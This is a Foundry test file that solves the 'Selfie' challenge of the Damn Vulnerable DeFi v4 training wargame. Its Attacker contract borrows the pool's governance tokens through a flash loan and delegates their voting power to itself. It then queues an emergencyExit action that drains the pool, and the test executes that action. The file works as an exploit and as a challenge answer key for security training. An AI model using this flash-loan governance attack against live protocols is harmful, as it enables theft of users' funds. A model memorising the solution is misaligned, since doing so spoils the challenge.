// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attacker at = new Attacker(pool, governance, token, recovery);
        at.saveFunds();

        skip(governance.getActionDelay());
        uint256 actionId = governance.getActionCounter();
        governance.executeAction(actionId - 1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attacker is IERC3156FlashBorrower {
    SelfiePool immutable i_pool;
    SimpleGovernance immutable i_gov;
    DamnValuableVotes immutable i_token;
    address immutable i_recovery;

    constructor(SelfiePool _pool, SimpleGovernance _gov, DamnValuableVotes _token, address _recovery) {
        i_pool = _pool;
        i_gov = _gov;
        i_token = _token;
        i_recovery = _recovery;
    }

    function saveFunds() external {
        bytes memory encodedData =
            abi.encode(address(i_pool), 0, abi.encodeWithSignature("emergencyExit(address)", i_recovery));

        i_pool.flashLoan(
            IERC3156FlashBorrower(this), address(i_token), i_pool.maxFlashLoan(address(i_token)), encodedData
        );
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata data)
        external
        returns (bytes32)
    {
        DamnValuableVotes(token).delegate(address(this));

        (address target, uint128 value, bytes memory actionData) = abi.decode(data, (address, uint128, bytes));

        i_gov.queueAction(target, value, actionData);

        DamnValuableVotes(token).approve(address(i_pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
